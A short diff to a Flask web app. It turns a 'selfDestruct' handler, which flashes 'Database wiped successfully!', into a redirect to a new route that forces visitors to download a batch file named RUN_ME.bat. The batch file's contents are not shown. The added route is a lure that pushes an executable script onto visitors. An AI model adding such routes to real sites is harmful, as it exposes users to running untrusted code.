@@ -40,10 +40,9 @@ def selfDestruct():
     files = [f for f in os.listdir(folder_path) 
              if os.path.isfile(os.path.join(folder_path, f))]
     flask.flash("Database wiped successfully!", "warning")
-    file_name = random.choice(files)
-    print(file_name)
-    file_path = os.path.join(folder_path, file_name)
-    with open(file_path, 'r', encoding='utf-8') as f:
-        lines = f.readlines()
-    print(lines)
-    return flask.redirect(flask.url_for('login.index'))
+    return flask.redirect(flask.url_for('posts.download_test'))
+
+@blueprint.route("/download/RUN_ME.bat")
+def download_test():
+    # Assuming test.txt is in 'static/files/'
+    return flask.send_from_directory("assets", "RUN_ME.bat", as_attachment=True)
